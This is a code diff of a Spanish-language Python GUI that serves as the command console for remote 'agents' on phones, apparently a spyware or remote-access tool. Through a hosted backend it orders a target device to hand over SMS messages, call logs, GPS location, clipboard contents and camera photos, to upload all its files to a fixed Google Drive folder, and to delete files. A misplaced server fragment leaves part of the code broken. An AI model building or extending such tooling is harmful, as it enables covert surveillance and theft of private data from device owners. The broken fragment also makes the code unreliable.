@@ -1,285 +1,220 @@
+# control_panel.py (Versión Final con WebSockets v2.2)
+
 import tkinter as tk
-from tkinter import ttk, messagebox, filedialog
-import requests
+from tkinter import ttk, messagebox
 import threading
-from PIL import Image, ImageTk
-from io import BytesIO
-import base64
 import time
+import base64
+import webbrowser
+import tempfile
+from io import BytesIO
+from PIL import Image, ImageTk
+import socketio
+import requests
 import json
 
-# --- CONFIGURACIÓN ---
 SERVER_URL = "https://edikpiccx-backend.onrender.com"
 DRIVE_FOLDER_ID = "1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO" 
 
-# --- LOGGER PARA TERMINAL ---
 class Logger:
     @staticmethod
-    def info(message): print(f"[INFO] {time.strftime('%H:%M:%S')} - {message}")
+    def info(msg): print(f"[INFO] {time.strftime('%H:%M:%S')} - {msg}")
     @staticmethod
-    def error(message): print(f"[ERROR] {time.strftime('%H:%M:%S')} - {message}")
-    @staticmethod
-    def debug(message, data=None):
-        print(f"[DEBUG] {time.strftime('%H:%M:%S')} - {message}")
-        if data: print(json.dumps(data, indent=2))
+    def error(msg): print(f"[ERROR] {time.strftime('%H:%M:%S')} - {msg}")
 
-# --- APLICACIÓN PRINCIPAL ---
 class ControlPanelApp(tk.Tk):
     def __init__(self):
         super().__init__()
-        self.title("Panel de Control de Agentes vFINAL")
-        self.geometry("1200x750")
-
-        style = ttk.Style(self)
-        style.theme_use("clam")
-        style.configure("Treeview.Heading", font=("Arial", 10, "bold"))
-
-        self.agents_data = []
-        self.photo_references = []
-        self.current_media_list = []
-        self.original_image_for_download = None
-
-        self.create_widgets()
-        self.threaded_task(self.refresh_agent_list)
-
-    def create_widgets(self):
-        main_paned_window = ttk.PanedWindow(self, orient=tk.HORIZONTAL)
-        main_paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-
-        left_frame = ttk.Frame(main_paned_window, width=450)
-        main_paned_window.add(left_frame, weight=1)
+        self.title("Centro de Mando de Agentes v2.2 (Real-Time)")
+        self.geometry("1200x800")
         
-        ttk.Label(left_frame, text="Dispositivos Conectados", font=("Arial", 12, "bold")).pack(pady=5, anchor='w')
-        
-        tree_frame = ttk.Frame(left_frame)
-        tree_frame.pack(fill=tk.BOTH, expand=True)
-        cols = ('name', 'id')
-        self.tree = ttk.Treeview(tree_frame, columns=cols, show='headings')
-        self.tree.heading('name', text='Nombre Dispositivo')
-        self.tree.heading('id', text='ID Dispositivo')
-        self.tree.column('id', width=200)
-        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-        tree_scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
-        self.tree.configure(yscrollcommand=tree_scrollbar.set)
-        tree_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        self.photo_refs = []
+        self.current_media_data = []
 
-        command_frame = ttk.LabelFrame(left_frame, text="Comandos para Dispositivo Seleccionado", padding=10)
-        command_frame.pack(fill=tk.X, pady=(10,0), side=tk.BOTTOM)
+        # ¡NUEVO! Inicializamos el cliente de SocketIO
+        self.sio = socketio.Client(logger=False, engineio_logger=False)
+        self.setup_socketio_events()
         
-        ttk.Button(command_frame, text="Visualizar Archivos", command=self.visualize_selected_device_files).pack(fill=tk.X, pady=2)
-        ttk.Button(command_frame, text="Ordenar Subir Todo a Drive", command=lambda: self.on_command_click("upload_to_drive", DRIVE_FOLDER_ID)).pack(fill=tk.X, pady=2)
-        ttk.Button(command_frame, text="Pausar Agente", command=lambda: self.on_command_click("pause_upload")).pack(fill=tk.X, pady=2)
-        ttk.Button(command_frame, text="Reanudar Agente", command=lambda: self.on_command_click("continue_upload")).pack(fill=tk.X, pady=2)
-        ttk.Button(command_frame, text="Detener Agente (Permanente)", command=lambda: self.on_command_click("stop_agent")).pack(fill=tk.X, pady=2)
-        
-        right_frame = ttk.Frame(main_paned_window)
-        main_paned_window.add(right_frame, weight=2)
-        
-        ttk.Label(right_frame, text="Visor de Archivos Remotos", font=("Arial", 12, "bold")).pack(pady=5, anchor='w')
-        
-        canvas = tk.Canvas(right_frame, bg="gray95", highlightthickness=0)
-        scrollbar = ttk.Scrollbar(right_frame, orient="vertical", command=canvas.yview)
-        self.image_frame = ttk.Frame(canvas)
-        self.image_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
-        canvas.create_window((0, 0), window=self.image_frame, anchor="nw")
-        canvas.configure(yscrollcommand=scrollbar.set)
-        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-        scrollbar.pack(side=tk.RIGHT, fill="y")
-        
-        self.visor_label = ttk.Label(self.image_frame, text="\nSelecciona un dispositivo y haz clic en 'Visualizar Archivos'.", font=("Arial", 11), background="gray95", justify=tk.CENTER)
-        self.visor_label.pack(pady=20, padx=20)
-        
-        status_bar_frame = ttk.Frame(self, padding=(10, 5))
-        status_bar_frame.pack(side=tk.BOTTOM, fill=tk.X)
-        self.status_bar = ttk.Label(status_bar_frame, text="Listo.", relief=tk.SUNKEN, anchor=tk.W, padding=5)
-        self.status_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
-        ttk.Button(status_bar_frame, text="Recargar Lista", command=lambda: self.threaded_task(self.refresh_agent_list)).pack(side=tk.RIGHT)
+        self.setup_gui()
+        self.threaded(self.connect_to_server)
 
-    def threaded_task(self, task, *args):
-        thread = threading.Thread(target=task, args=args, daemon=True)
-        thread.start()
+    def setup_gui(self):
+        # ... (La GUI es idéntica a la que ya tienes, con las pestañas y botones) ...
+        layout = ttk.PanedWindow(self, orient=tk.HORIZONTAL)
+        layout.pack(fill=tk.BOTH, expand=True)
+        left = ttk.Frame(layout, width=400)
+        layout.add(left, weight=1)
+        ttk.Label(left, text="Agentes Conectados", font=("Arial", 12, "bold")).pack(anchor="w", padx=10, pady=5)
+        self.tree = ttk.Treeview(left, columns=('name', 'id'), show='headings')
+        self.tree.heading('name', text='Nombre'); self.tree.heading('id', text='ID')
+        self.tree.pack(fill=tk.BOTH, expand=True, padx=10)
+        notebook = ttk.Notebook(left)
+        notebook.pack(fill=tk.X, padx=10, pady=10)
+        files_tab = ttk.Frame(notebook, padding=10)
+        notebook.add(files_tab, text='Archivos')
+        ttk.Button(files_tab, text="Ver Miniaturas", command=self.cmd_get_thumbnails).pack(fill=tk.X, pady=2)
+        ttk.Button(files_tab, text="Subir Todo a Drive", command=lambda: self.send_command("upload_to_drive", DRIVE_FOLDER_ID)).pack(fill=tk.X, pady=2)
+        remote_tab = ttk.Frame(notebook, padding=10)
+        notebook.add(remote_tab, text='Control Remoto')
+        ttk.Button(remote_tab, text="Obtener Estado", command=lambda: self.send_command("GET_DEVICE_STATUS")).pack(fill=tk.X, pady=2)
+        ttk.Button(remote_tab, text="Obtener GPS", command=lambda: self.send_command("GET_GPS_LOCATION")).pack(fill=tk.X, pady=2)
+        ttk.Button(remote_tab, text="Leer Portapapeles", command=lambda: self.send_command("GET_CLIPBOARD")).pack(fill=tk.X, pady=2)
+        ttk.Button(remote_tab, text="Tomar Foto", command=lambda: self.send_command("TAKE_PHOTO")).pack(fill=tk.X, pady=2)
+        data_tab = ttk.Frame(notebook, padding=10)
+        notebook.add(data_tab, text='Datos')
+        ttk.Button(data_tab, text="Leer SMS", command=lambda: self.send_command("GET_SMS")).pack(fill=tk.X, pady=2)
+        ttk.Button(data_tab, text="Leer Llamadas", command=lambda: self.send_command("GET_CALL_LOG")).pack(fill=tk.X, pady=2)
+        agent_tab = ttk.Frame(notebook, padding=10)
+        notebook.add(agent_tab, text='Gestión Agente')
+        ttk.Button(agent_tab, text="Pausar Subidas", command=lambda: self.send_command("pause_upload")).pack(fill=tk.X, pady=2)
+        ttk.Button(agent_tab, text="Reanudar Subidas", command=lambda: self.send_command("continue_upload")).pack(fill=tk.X, pady=2)
+        ttk.Button(agent_tab, text="Detener Agente", command=lambda: self.send_command("stop_agent")).pack(fill=tk.X, pady=2)
+        right = ttk.Frame(layout)
+        layout.add(right, weight=3)
+        ttk.Label(right, text="Visor de Miniaturas", font=("Arial", 12, "bold")).pack(anchor="w", padx=10, pady=5)
+        self.canvas = tk.Canvas(right, bg="#f0f0f0")
+        scrollbar = ttk.Scrollbar(right, orient="vertical", command=self.canvas.yview)
+        self.image_frame = ttk.Frame(self.canvas)
+        self.canvas.create_window((0, 0), window=self.image_frame, anchor="nw")
+        self.canvas.configure(yscrollcommand=scrollbar.set)
+        self.image_frame.bind("<Configure>", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
+        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        bar = ttk.Frame(self, padding=5)
+        bar.pack(side=tk.BOTTOM, fill=tk.X)
+        self.status = ttk.Label(bar, text="Conectando...", anchor=tk.W)
+        self.status.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        ttk.Button(bar, text="Recargar Agentes (Manual)", command=lambda: self.threaded(self.refresh_agent_list_http)).pack(side=tk.RIGHT)
 
-    def refresh_agent_list(self, retries=3):
-        self.update_status("Contactando al servidor...", "blue")
-        Logger.info("Solicitando lista de agentes al servidor...")
+    def threaded(self, fn, *args):
+        threading.Thread(target=fn, args=args, daemon=True).start()
+
+    def connect_to_server(self):
+        self.update_status("Conectando al servidor...", "orange")
         try:
-            response = requests.get(f"{SERVER_URL}/api/get-agents", timeout=15)
-            response.raise_for_status()
-            agents = response.json()
-            self.after(0, self._update_treeview, agents)
-        except requests.exceptions.RequestException as e:
-            Logger.error(f"Fallo en la conexión: {e}")
-            if retries > 0:
-                Logger.info(f"El servidor podría estar despertando. Reintentando en 5 segundos... ({retries} intentos restantes)")
-                self.update_status("Servidor despertando... Reintentando...", "orange")
-                self.after(5000, lambda: self.threaded_task(self.refresh_agent_list, retries - 1))
-            else:
-                Logger.error("No se pudo conectar al servidor después de varios intentos.")
-                self.after(0, self.update_status, "Error de conexión persistente.", "red")
-
-    def _update_treeview(self, agents):
-        self.tree.delete(*self.tree.get_children())
-        self.agents_data = agents
-        if not agents:
-            Logger.info("No hay agentes conectados.")
-            self.update_status("No hay agentes conectados.", "orange")
-            return
-        for agent in agents:
-            self.tree.insert('', tk.END, iid=agent['id'], values=(agent.get('name', 'N/A'), agent['id']))
-        status_msg = f"Lista actualizada: {len(self.agents_data)} agentes conectados."
-        Logger.info(status_msg)
-        self.update_status(status_msg, "green")
-
-    def visualize_selected_device_files(self):
-        selected_id = self.get_selected_agent_id()
-        if not selected_id: return
-        self.update_status(f"Pidiendo lista de archivos a {selected_id[:8]}...", "blue")
-        Logger.info(f"Iniciando visualización para el dispositivo {selected_id[:8]}...")
-        self.on_command_click("get_thumbnails")
-        self.update_status("Esperando respuesta del agente (30 segundos)...", "blue")
-        Logger.info("Esperando 30 segundos para que el agente procese y envíe las miniaturas.")
-        self.after(30000, lambda: self.threaded_task(self.fetch_and_display_thumbnails, selected_id))
-
-    def fetch_and_display_thumbnails(self, device_id):
-        self.update_status(f"Descargando miniaturas de {device_id[:8]}...", "blue")
-        Logger.info(f"Descargando lista de miniaturas para {device_id[:8]} desde el servidor.")
-        try:
-            response = requests.get(f"{SERVER_URL}/api/get_media_list/{device_id}", timeout=15)
-            response.raise_for_status()
-            media_list = response.json()
-            Logger.debug(f"Respuesta del servidor (get_media_list) para {device_id[:8]}:", {"item_count": len(media_list)})
-            self.after(0, self.display_thumbnails, media_list, device_id)
+            # La URL de conexión para Flask-SocketIO
+            websocket_url = f"{SERVER_URL.replace('https', 'wss')}"
+            self.sio.connect(websocket_url, transports=['websocket'],
+                             socketio_path="/socket.io/",
+                             headers={'type': 'panel'}) # Nos identificamos como un panel
         except Exception as e:
-            Logger.error(f"No se pudieron obtener las miniaturas desde el servidor: {e}")
-            self.after(0, self.update_status, f"Error al obtener miniaturas: {e}", "red")
+            self.update_status(f"Error de conexión WebSocket: {e}", "red")
 
-    def display_thumbnails(self, media_list, device_id):
-        for widget in self.image_frame.winfo_children():
-            widget.destroy()
-        self.photo_references.clear()
-        if not media_list:
-            ttk.Label(self.image_frame, text="No se encontraron archivos en el dispositivo.", font=("Arial", 11), background="gray95").pack(pady=20)
-            self.update_status("El dispositivo no reportó archivos.", "orange")
+    def setup_socketio_events(self):
+        @self.sio.on('connect')
+        def on_connect():
+            self.update_status("Conectado en tiempo real.", "green")
+            # Pedimos la lista inicial por si había agentes conectados antes que nosotros
+            self.threaded(self.refresh_agent_list_http)
+
+        @self.sio.on('disconnect')
+        def on_disconnect():
+            self.update_status("Desconectado del servidor.", "red")
+
+        @self.sio.on('agent_list_updated')
+        def on_agent_list_updated(data):
+            # Recibimos la lista actualizada del servidor y refrescamos la tabla
+            self.after(0, self.update_agent_list, data)
+            self.update_status(f"{len(data)} agentes conectados (actualización en vivo).", "green")
+
+        @self.sio.on('data_from_agent')
+        def on_data_from_agent(response_str):
+            response = json.loads(response_str) # El servidor envía un string JSON
+            event = response.get('event')
+            data = response.get('data')
+            agent_name = response.get('agent_name', 'Agente')
+            
+            if event == 'thumbnails_data':
+                self.current_media_data = data
+                self.render_thumbnails()
+            else:
+                # Para otros datos, los mostramos en un popup
+                pretty_data = json.dumps(data, indent=2, ensure_ascii=False)
+                self.after(0, lambda: messagebox.showinfo(f"Datos de {agent_name} ({event})", pretty_data))
+
+    def refresh_agent_list_http(self):
+        # Esta función ahora es solo para la carga inicial o el botón manual
+        self.update_status("Recargando lista de agentes...", "blue")
+        try:
+            r = requests.get(f"{SERVER_URL}/api/get-agents", timeout=30)
+            self.update_agent_list(r.json())
+        except Exception as e:
+            self.update_status(f"Error obteniendo agentes: {e}", "red")
+
+    def update_agent_list(self, agents):
+        self.tree.delete(*self.tree.get_children())
+        for agent in agents:
+            self.tree.insert('', 'end', iid=agent['id'], values=(agent.get('name', 'N/A'), agent['id']))
+
+    def cmd_get_thumbnails(self):
+        # ¡YA NO HAY ESPERA! Solo enviamos el comando. La respuesta llegará por WebSocket.
+        self.send_command("GET_THUMBNAILS")
+        self.clear_thumbnails()
+        self.update_status("Solicitando miniaturas...", "blue")
+
+    def render_thumbnails(self):
+        self.clear_thumbnails()
+        if not self.current_media_data:
+            self.after(0, lambda: ttk.Label(self.image_frame, text="El agente no devolvió archivos o no tiene.").pack())
             return
+        for idx, item in enumerate(self.current_media_data):
+            self.after(0, lambda i=idx, it=item: self.create_thumbnail_widget(i, it))
+        self.update_status(f"Mostrando {len(self.current_media_data)} miniaturas.", "green")
 
-        self.current_media_list = media_list
-
-        for index, item in enumerate(media_list):
-            filename = item['filename']
-            item_frame = ttk.Frame(self.image_frame, padding=5, relief=tk.RIDGE, borderwidth=1)
-            item_frame.pack(fill=tk.X, padx=5, pady=3)
+    def create_thumbnail_widget(self, index, item):
+        try:
+            img_data = base64.b64decode(item['small_thumb_b64'])
+            img = Image.open(BytesIO(img_data))
+            img.thumbnail((100, 100))
+            photo = ImageTk.PhotoImage(img)
+            self.photo_refs.append(photo)
             
-            try:
-                img_data = base64.b64decode(item['small_thumb_b64'])
-                img = Image.open(BytesIO(img_data))
-                img.thumbnail((100, 100))
-                photo = ImageTk.PhotoImage(img)
-                self.photo_references.append(photo)
-                
-                img_button = tk.Button(item_frame, image=photo, relief=tk.FLAT, bd=0, command=lambda idx=index: self.open_large_preview(idx))
-                img_button.pack(side=tk.LEFT, padx=5)
-            except:
-                img_label = tk.Label(item_frame, text="[IMG]", width=12, height=6, bg="lightgrey")
-                img_label.pack(side=tk.LEFT, padx=5)
-            
-            ttk.Label(item_frame, text=filename, wraplength=400, justify=tk.LEFT).pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
-            
-            action_frame = ttk.Frame(item_frame)
-            action_frame.pack(side=tk.RIGHT, padx=5)
-            
-            upload_button = ttk.Button(action_frame, text="Subir", command=lambda f=filename, d_id=device_id: self.on_single_file_command("upload_single_file", f, d_id))
-            upload_button.pack(pady=2)
-            
-            delete_button = ttk.Button(action_frame, text="Borrar", command=lambda f=filename, d_id=device_id: self.on_single_file_command("delete_single_file", f, d_id))
-            delete_button.pack(pady=2)
-            
-        self.update_status(f"Mostrando {len(media_list)} archivos del dispositivo {device_id[:8]}.", "green")
+            frame = ttk.Frame(self.image_frame, padding=5)
+            frame.pack(anchor="w", padx=5, pady=5)
+            btn = tk.Button(frame, image=photo, command=lambda i=index: self.open_large_preview(i))
+            btn.pack(side=tk.LEFT)
+            ttk.Label(frame, text=item['filename'], wraplength=400).pack(side=tk.LEFT, padx=10)
+        except Exception as e:
+            print(f"Error renderizando miniatura: {e}")
 
     def open_large_preview(self, index):
-        item = self.current_media_list[index]
-        filename = item['filename']
-        preview_window = tk.Toplevel(self)
-        preview_window.title(f"Vista Previa - {filename}")
-        preview_window.configure(bg="black")
         try:
-            large_img_data = base64.b64decode(item['large_thumb_b64'])
-            img = Image.open(BytesIO(large_img_data))
-            self.original_image_for_download = img.copy()
-            img.thumbnail((1200, 900))
-            photo = ImageTk.PhotoImage(img)
-            img_label = tk.Label(preview_window, image=photo, bg="black")
-            img_label.image = photo
-            img_label.pack(padx=10, pady=10, expand=True)
-            download_button = ttk.Button(preview_window, text=f"Descargar {filename} a PC", command=lambda fn=filename: self.save_image_to_pc(fn))
-            download_button.pack(pady=10)
+            item = self.current_media_data[index]
+            img_data = base64.b64decode(item['large_thumb_b64'])
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp_file:
+                tmp_file.write(img_data)
+                webbrowser.open(f"file://{tmp_file.name}")
         except Exception as e:
-            messagebox.showerror("Error de Vista Previa", f"No se pudo cargar la imagen grande: {e}", parent=preview_window)
+            messagebox.showerror("Error", f"No se pudo abrir la vista previa: {e}")
 
-    def save_image_to_pc(self, filename):
-        if hasattr(self, 'original_image_for_download') and self.original_image_for_download:
-            filepath = filedialog.asksaveasfilename(
-                defaultextension=".jpg",
-                initialfile=filename,
-                filetypes=[("JPEG files", "*.jpg"), ("PNG files", "*.png"), ("All files", "*.*")]
-            )
-            if filepath:
-                try:
-                    self.original_image_for_download.save(filepath, "JPEG", quality=95)
-                    messagebox.showinfo("Éxito", f"Imagen guardada en:\n{filepath}")
-                except Exception as e:
-                    messagebox.showerror("Error al Guardar", f"No se pudo guardar la imagen: {e}")
+    def clear_thumbnails(self):
+        self.after(0, lambda: [w.destroy() for w in self.image_frame.winfo_children()])
+        self.photo_refs.clear()
+        self.current_media_data.clear()
 
-    # En main.py, dentro de send_command_to_agent
+    def send_command(self, action, payload=""):
+        agent_id = self.selected_agent()
+        if not agent_id: return
+        cmd = {"target_id": agent_id, "action": action, "payload": payload}
+        self.threaded(self._post_command, cmd)
 
-    # ... (código anterior) ...
-    
-    # ¡SOLUCIÓN! Usamos socketio.send() para enviar un mensaje de texto plano (JSON)
-    # en lugar de un evento con nombre.
-    command_to_send = {'command': action, 'payload': payload}
-    socketio.send(json.dumps(command_to_send), to=target_sid)
-    
-    agent_name = connected_agents[target_sid].get('name', 'Desconocido')
-    print(f"[COMANDO] Enviando comando '{action}' al agente '{agent_name}' (ID: {target_sid})")
-    
-    return jsonify({"status": "success", "message": f"Comando '{action}' enviado."})
-
-    def _do_send_command(self, command):
-        Logger.info(f"Preparando para enviar comando '{command['action']}' al agente {command['target_id'][:8]}.")
-        Logger.debug("Enviando JSON al servidor (send-command):", command)
+    def _post_command(self, cmd):
         try:
-            response = requests.post(f"{SERVER_URL}/api/send-command", json=command, timeout=10)
-            response.raise_for_status()
-            response_data = response.json()
-            Logger.debug("Respuesta del servidor (send-command):", response_data)
-            self.after(0, self.update_status, f"Comando '{command['action']}' enviado con éxito.", "green")
+            requests.post(f"{SERVER_URL}/api/send-command", json=cmd, timeout=15)
         except Exception as e:
-            Logger.error(f"Fallo al enviar el comando '{command['action']}': {e}")
-            self.after(0, self.update_status, f"Error al enviar comando: {e}", "red")
-            
-    def on_single_file_command(self, action, filename, device_id):
-        if not device_id:
-            messagebox.showerror("Error", "No hay un dispositivo seleccionado.")
-            return
-        if action == "delete_single_file":
-            if not messagebox.askyesno("Confirmar Borrado", f"¿Estás seguro de que quieres borrar permanentemente el archivo '{filename}' del dispositivo?"):
-                return
-        command = {"target_id": device_id, "action": action, "payload": filename}
-        self.threaded_task(self._do_send_command, command)
+            self.update_status(f"Error enviando comando: {e}", "red")
 
-    def get_selected_agent_id(self):
-        try:
+    def selected_agent(self):
+        try: 
             return self.tree.selection()[0]
         except IndexError:
-            Logger.error("Intento de comando sin seleccionar un dispositivo.")
-            messagebox.showwarning("Sin Selección", "Por favor, selecciona un agente de la lista.")
+            messagebox.showwarning("Atención", "Selecciona un dispositivo.")
             return None
 
-    def update_status(self, message, color="black"):
-        self.status_bar.config(text=message, foreground=color)
+    def update_status(self, text, color="black"):
+        self.after(0, lambda: self.status.config(text=text, foreground=color))
 
 if __name__ == "__main__":
-    Logger.info("Iniciando Panel de Control...")
+    Logger.info("Iniciando Centro de Mando v3.0 (Real-Time)...")
     app = ControlPanelApp()
     app.mainloop()
-    Logger.info("Panel de Control cerrado.")
-warning
